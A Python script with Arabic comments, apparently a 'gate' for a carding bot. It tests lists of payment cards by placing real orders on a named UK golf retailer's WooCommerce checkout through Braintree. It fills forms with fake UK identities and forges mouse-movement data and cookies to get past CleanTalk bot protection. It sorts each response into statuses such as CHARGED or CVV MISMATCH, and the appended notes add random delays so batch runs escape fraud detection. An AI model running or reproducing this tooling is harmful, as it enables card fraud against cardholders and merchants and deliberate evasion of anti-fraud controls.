# ==================== gatet.py (النسخة النهائية مع تحسينات السرعة والتأخير العشوائي) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

def clean_html(text):
    """إزالة HTML tags من النص"""
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    """استخراج السبب بعد 'Reason:'"""
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_pointer_data():
    """تولد بيانات حركة ماوس عشوائية تشبه الإنسان"""
    pointer_data = []
    start_time = random.randint(30000, 60000)
    
    for i in range(random.randint(5, 12)):  # زيادة عدد حركات الماوس (5-12)
        x = random.randint(200, 700)
        y = random.randint(50, 400)
        timestamp = start_time + random.randint(1000, 5000) * i
        pointer_data.append([x, y, timestamp])
    
    return json.dumps(pointer_data).replace(' ', '')

def extract_cleantalk_values(session, url):
    """تستخرج ct_checkjs و apbct_visible_fields من الصفحة"""
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        ct_checkjs = None
        checkjs_input = soup.find('input', {'name': 'ct_checkjs'})
        if checkjs_input:
            ct_checkjs = checkjs_input.get('value')
        
        apbct_visible = None
        visible_input = soup.find('input', {'id': 'apbct_visible_fields'})
        if not visible_input:
            visible_input = soup.find('input', {'name': 'apbct_visible_fields'})
        if visible_input:
            apbct_visible = visible_input.get('value')
        
        return ct_checkjs, apbct_visible
    except Exception as e:
        print(f"[!] Error extracting CleanTalk values: {e}")
        return None, None

def generate_valid_uk_data():
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    uk_postcodes = ['SW1A1AA', 'M11AE', 'B11TT', 'LS11UR', 'G11XU', 'EH11QQ', 'CF101EP', 'NE11EE', 'L11JA', 'S12BJ']
    uk_cities = ['London', 'Manchester', 'Birmingham', 'Leeds', 'Glasgow', 'Edinburgh', 'Cardiff', 'Newcastle', 'Liverpool', 'Sheffield']
    uk_phones = ['07712345678', '07890123456', '07987654321', '07412345678', '07567890123', '07789123456', '07891234567', '07912345678']
    uk_addresses = ['10 Downing Street', '221B Baker Street', 'Buckingham Palace Road', 'Abbey Road', 'Oxford Street',
                    'King Edward Street', 'Piccadilly Circus', 'Trafalgar Square', 'Covent Garden', 'Liverpool Street']
    
    # إيميلات من دومينات متعددة
    email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', 
                     '@protonmail.com', '@mail.com', '@gmx.com', '@yandex.com', '@zoho.com']
    email_domain = random.choice(email_domains)
    
    return {
        'first_name': first,
        'last_name': last,
        'email': f"{first.lower()}.{last.lower()}{random.randint(1,9999)}{email_domain}",
        'phone': random.choice(uk_phones),
        'address_1': random.choice(uk_addresses),
        'city': random.choice(uk_cities),
        'postcode': random.choice(uk_postcodes),
        'company': f"{first}'s {random.choice(['Golf', 'Sports', 'Retail', 'Ltd', 'Shop'])}" if random.choice([True, False]) else ''
    }

def ch(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    user = generate_user_agent()
    fake_data = generate_valid_uk_data()
    session_id = str(uuid.uuid4())
    correlation_id = str(uuid.uuid4())[:24]
    r = requests.session()
    
    # إضافة Request ID عشوائي
    request_id = str(uuid.uuid4())
    
    # ================ استخراج قيم CleanTalk من الموقع ================
    product_url = 'https://www.expressgolf.co.uk/product/bees-tees-short-medium-long/'
    
    initial_response = r.get(product_url)
    ct_checkjs, apbct_visible_fields = extract_cleantalk_values(r, product_url)
    
    if not ct_checkjs:
        ct_checkjs = '3f6280b1f540be05f340d33f9d2c7b1978d48f5bccbc455cdc521db6e2a5ea37'
        print("[!] Using fallback ct_checkjs")
    if not apbct_visible_fields:
        apbct_visible_fields = 'eyIwIjp7InZpc2libGVfZmllbGRzIjoicXVhbnRpdHkiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6ImF0dHJpYnV0ZV9zaXplIHdvb2J0X2lkcyBhZGQtdG8tY2FydCBwcm9kdWN0X2lkIHZhcmlhdGlvbl9pZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjV9fQ=='
        print("[!] Using fallback apbct_visible_fields")
    
    ct_pointer_data = generate_pointer_data()
    ct_ps_timestamp = str(int(time.time()) + random.randint(100, 500))
    ct_fkp_timestamp = str(int(time.time()) + random.randint(50, 200))
    
    print(f"[+] CleanTalk - ct_checkjs: {ct_checkjs[:30]}...")
    print(f"[+] CleanTalk - pointer_data generated: {ct_pointer_data[:50]}...")
    
    # ================ 1. ADD TO CART (مع تأخير عشوائي قبل) ================
    # تأخير عشوائي قبل البدء (محاكاة لتأخير بشري)
    pre_delay = random.uniform(2, 5)
    time.sleep(pre_delay)
    
    variation = random.choice(['Long 83mm (15)', 'Medium 69mm (20)', 'Short 53mm (25)'])
    variation_id_map = {
        'Long 83mm (15)': '170451',
        'Medium 69mm (20)': '170450',
        'Short 53mm (25)': '170449'
    }
    variation_id = variation_id_map[variation]
    
    params_get = {'attribute_size': variation}
    r.get(product_url, params=params_get)
    
    cookies_add = {
        'apbct_site_referer': '0',
        'ct_sfw_pass_key': '0f857d46afa44efbeb140ba12615e3980',
        'swpext86386': '795155b76f575dd1d81ded158910458d',
        'ct_checkjs': ct_checkjs,
        'apbct_headless': 'false',
        'cp-impression-added-forcp_id_87a52': 'true',
        'cp_id_87a52': 'true',
        'ct_mouse_moved': 'true',
        'ct_pointer_data': ct_pointer_data,
        'ct_ps_timestamp': ct_ps_timestamp,
        'ct_fkp_timestamp': ct_fkp_timestamp,
    }
    
    files = {
        'attribute_size': (None, variation),
        'woobt_ids': (None, ''),
        'quantity': (None, '1'),
        'add-to-cart': (None, '170448'),
        'product_id': (None, '170448'),
        'variation_id': (None, variation_id),
        'apbct_visible_fields': (None, apbct_visible_fields),
    }
    
    headers_add = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': f'{product_url}?attribute_size={variation.replace(" ", "+")}',
        'user-agent': user,
        'upgrade-insecure-requests': '1',
        'accept-encoding': 'gzip, deflate, br',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.post(product_url, headers=headers_add, files=files, cookies=cookies_add)
    if response.status_code != 200:
        return f'ADD_TO_CART_FAILED'
    
    # تأخير عشوائي بعد إضافة المنتج
    time.sleep(random.uniform(1.5, 3.5))
    
    # ================ 2. CHECKOUT PAGE ================
    headers_checkout = {
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.expressgolf.co.uk/basket/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user,
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.get('https://www.expressgolf.co.uk/checkout/', headers=headers_checkout)
    if response.status_code != 200:
        return f'CHECKOUT_PAGE_FAILED'
    
    # تأخير عشوائي إضافي
    time.sleep(random.uniform(1, 2.5))
    
    # ================ 3. EXTRACT TOKENS AND NONCES ================
    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
    if not enc:
        return 'CLIENT_TOKEN_NOT_FOUND'
    dec = base64.b64decode(enc.group(1)).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
    if not au:
        return 'FINGERPRINT_NOT_FOUND'
    au = au[0]
    
    sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
    if not sec:
        return 'UPDATE_ORDER_NONCE_NOT_FOUND'
    sec = sec.group(1)
    
    check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
    if not check:
        return 'CHECKOUT_NONCE_NOT_FOUND'
    check = check.group(1)
    
    # تأخير عشوائي
    time.sleep(random.uniform(0.5, 1.5))
    
    # ================ 4. UPDATE ORDER REVIEW ================
    billing_email = fake_data['email']
    billing_first = fake_data['first_name']
    billing_last = fake_data['last_name']
    billing_company = fake_data['company']
    billing_address = fake_data['address_1']
    billing_city = fake_data['city']
    billing_postcode = fake_data['postcode']
    billing_phone = fake_data['phone']
    
    headers_update = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': 'https://www.expressgolf.co.uk/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_update = {'wc-ajax': 'update_order_review'}
    
    data_update = f'security={sec}&payment_method=braintree_cc&country=GB&state=&postcode=&city=&address=&address_2=&s_country=GB&s_state=&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252Fproduct%252Fbees-tees-short-medium-long%252F%253Fattribute_size%253DMedium%252B69mm%252B(20)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D%26wc_order_attribution_utm_creative_format%3D%26wc_order_attribution_utm_marketing_tactic%3D%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252Fbasket%252F%26wc_order_attribution_session_start_time%3D2026-05-10%252016%253A58%253A47%26wc_order_attribution_session_pages%3D3%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_email%3D{billing_email}%26billing_first_name%3D{billing_first}%26billing_last_name%3D{billing_last}%26billing_company%3D{billing_company}%26billing_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26billing_address_1%3D{billing_address.replace(" ", "%20")}%26billing_address_2%3D%26billing_city%3D{billing_city}%26billing_state%3D%26billing_postcode%3D{billing_postcode}%26billing_phone%3D{billing_phone}%26wc_apbct_email_id%3D%26mailchimp_woocommerce_newsletter%3D1%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26order_comments%3D%26shipping_method%255B0%255D%3Dflat_rate%253A82%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=flat_rate%3A82'
    
    response = r.post('https://www.expressgolf.co.uk/', params=params_update, headers=headers_update, data=data_update)
    
    # تأخير عشوائي
    time.sleep(random.uniform(0.5, 1.5))
    
    # ================ 5. TOKENIZE CREDIT CARD ================
    headers_token = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': user,
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    token_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': session_id,
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': billing_postcode,
                        'streetAddress': billing_address[:50],
                    },
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data)
    try:
        tok = response.json()['data']['tokenizeCreditCard']['token']
    except:
        return f'TOKENIZATION_FAILED'
    
    # تأخير عشوائي
    time.sleep(random.uniform(0.8, 1.8))
    
    # ================ 6. FINAL CHECKOUT ================
    cookies_final = {
        'apbct_site_referer': '0',
        'ct_sfw_pass_key': '0f857d46afa44efbeb140ba12615e3980',
        'swpext86386': '795155b76f575dd1d81ded158910458d',
        'ct_checkjs': ct_checkjs,
        'apbct_headless': 'false',
        'cp-impression-added-forcp_id_87a52': 'true',
        'cp_id_87a52': 'true',
        'ct_mouse_moved': 'true',
        'ct_has_scrolled': 'true',
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': 'f5c37c02a40d99eb91c3c177eceaaf6f',
        'ct_pointer_data': ct_pointer_data,
        'ct_ps_timestamp': ct_ps_timestamp,
    }
    
    headers_final = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': 'https://www.expressgolf.co.uk/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_final = {'wc-ajax': 'checkout'}
    
    data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.expressgolf.co.uk%2Fproduct%2Fbees-tees-short-medium-long%2F%3Fattribute_size%3DMedium%2B69mm%2B(20)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=&wc_order_attribution_utm_creative_format=&wc_order_attribution_utm_marketing_tactic=&wc_order_attribution_session_entry=https%3A%2F%2Fwww.expressgolf.co.uk%2Fbasket%2F&wc_order_attribution_session_start_time=2026-05-10+16%3A58%3A47&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_email={billing_email}&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_company={billing_company}&billing_country=GB&billing_address_1={billing_address.replace(" ", "+")}&billing_address_2=&billing_city={billing_city}&billing_state=&billing_postcode={billing_postcode}&billing_phone={billing_phone}&shipping_first_name={billing_first}&shipping_last_name={billing_last}&shipping_company=&shipping_country=GB&shipping_address_1={billing_address.replace(" ", "+")}&shipping_address_2=&shipping_city={billing_city}&shipping_state=&shipping_postcode={billing_postcode}&order_comments=&shipping_method%5B0%5D=flat_rate%3A82&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields={apbct_visible_fields}'
    
    response = r.post('https://www.expressgolf.co.uk/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
    
    # ================ 7. PARSE RESULT ================
    try:
        result_data = json.loads(response.text)
        messages = result_data.get("messages", "")
        full_response = response.text
    except:
        return 'PARSE_ERROR'
    
    clean_messages = clean_html(messages)
    clean_full = clean_html(full_response)
    search_text = clean_messages + " " + clean_full
    
    reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
    reason = reason_match.group(1).strip() if reason_match else None
    
    print(f"[DEBUG] Clean response: {search_text[:300]}")
    
    # ================ ردود Braintree الكاملة والمفصلة ================
    
    # 1. النجاح
    if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
        # تأخير عشوائي بعد النجاح
        time.sleep(random.uniform(1, 2))
        return 'CHARGED'
    
    # 2. رصيد غير كافٍ
    if 'insufficient funds' in search_text:
        time.sleep(random.uniform(0.5, 1))
        return 'INSUFFICIENT FUNDS'
    
    # 3. CVV خطأ
    if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv verification failed' in search_text:
        time.sleep(random.uniform(0.5, 1))
        return 'CVV MISMATCH'
    
    # 4. بطاقة منتهية
    if 'expired card' in search_text:
        return 'EXPIRED CARD'
    
    # 5. Do Not Honor
    if 'do not honor' in search_text:
        return 'DO NOT HONOR'
    
    # 6. Closed Card
    if 'closed card' in search_text:
        return 'CLOSED CARD'
    
    # 7. Call Issuer
    if 'call issuer' in search_text:
        return 'CALL ISSUER'
    
    # 8. Pick Up Card
    if 'pick up card' in search_text:
        return 'PICK UP CARD'
    
    # 9. 3D Secure
    if '3d secure' in search_text or 'three_d_secure' in search_text:
        return '3D SECURE REQUIRED'
    
    # 10. Limit Exceeded
    if 'limit exceeded' in search_text:
        return 'LIMIT EXCEEDED'
    
    # 11. Lost/Stolen Card
    if 'lost or stolen' in search_text:
        return 'LOST/STOLEN CARD'
    
    # 12. Address Mismatch
    if 'address verification' in search_text or 'avs' in search_text:
        return 'ADDRESS MISMATCH'
    
    # 13. Processor Declined
    if 'processor declined' in search_text:
        return 'PROCESSOR DECLINED'
    
    # 14. Invalid Card
    if 'invalid card' in search_text or 'invalid card number' in search_text:
        return 'INVALID CARD'
    
    # 15. No Account
    if 'no account' in search_text or 'no_account' in search_text:
        return 'NO ACCOUNT'
    
    # 16. Card Not Activated
    if 'card not activated' in search_text or 'not activated' in search_text:
        return 'CARD NOT ACTIVATED'
    
    # 17. Cannot authorize at this time (policy)
    if 'cannot authorize at this time' in search_text or 'cannot authorize' in search_text:
        return 'CANNOT AUTHORIZE (POLICY)'
    
    # 18. Card type not accepted
    if 'card type is not accepted' in search_text or 'card type not accepted' in search_text:
        return 'CARD TYPE NOT ACCEPTED'
    
    # 19. Card restriction
    if 'restriction on the card' in search_text or 'issuer restriction' in search_text:
        return 'CARD RESTRICTION'
    
    # 20. CleanTalk suspect
    if 'cleantalk suspect' in search_text or 'cleantalk' in search_text:
        if 'fraud' in search_text or 'spam' in search_text:
            return 'CLEANTALK FRAUD SUSPECT'
        else:
            return 'CLEANTALK SUSPECT'
    
    # 21. Gateway rejected fraud
    if 'gateway rejected: fraud' in search_text or 'gateway reject fraud' in search_text:
        return 'GATEWAY REJECTED FRAUD'
    
    # 22. Risk Threshold
    if 'risk_threshold' in search_text or 'risk threshold' in search_text:
        return 'RISK THRESHOLD'
    
    # 23. Processor declined - fraud suspected
    if 'processor declined - fraud suspected' in search_text:
        return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
    
    # 24. Call issuer. pick up card
    if 'call issuer. pick up card' in search_text:
        return 'CALL ISSUER - PICK UP CARD'
    
    # 25. Email doesn't exist
    if 'email does not exist' in search_text or 'email doesn\'t exist' in search_text:
        return 'EMAIL DOES NOT EXIST'
    
    # 26. Pickup card
    if 'pickup card' in search_text:
        return 'PICKUP CARD'
    
    # 27. Fraud (عام)
    if 'fraud' in search_text or 'suspected fraud' in search_text:
        return 'SUSPECTED FRAUD'
    
    # 28. Generic Decline
    if 'declined' in search_text:
        return 'DECLINED'
    
    # 29. أي سبب تاني من الـ Reason
    if reason and len(reason) < 40:
        return reason.upper()
    
    # 30. نص الـ messages نفسه لو قصير
    if clean_messages and len(clean_messages) < 60:
        return clean_messages.title()
    
    return 'DECLINED'


# ==================== في main.py (تعديل وقت التأخير بين البطاقات في الكومبو) ====================
'''

في دالة menu_callback، ابحث عن sleep_time وغيرها إلى:

sleep_time = random.uniform(35, 60)  # من 35 إلى 60 ثانية بين كل بطاقة

وده عشان الكومبو ميكونش سريع جداً ويزيد نسبة الـ Fraud.

'''


# ==================== في main.py (تعديل أمر السينجل) ====================
'''

في دالة respond_to_braintree، بعد نهاية الفحص (آخر السطر) أضف:

# تأخير عشوائي كبير للسينجل (محاكاة سلوك بشري)
if random.random() < 0.7:  # 70% من المرات
    final_delay = random.uniform(45, 120)  # 45 ثانية - دقيقتين
    print(f"[*] Waiting {final_delay:.0f} seconds before next check...")
    time.sleep(final_delay)

'''
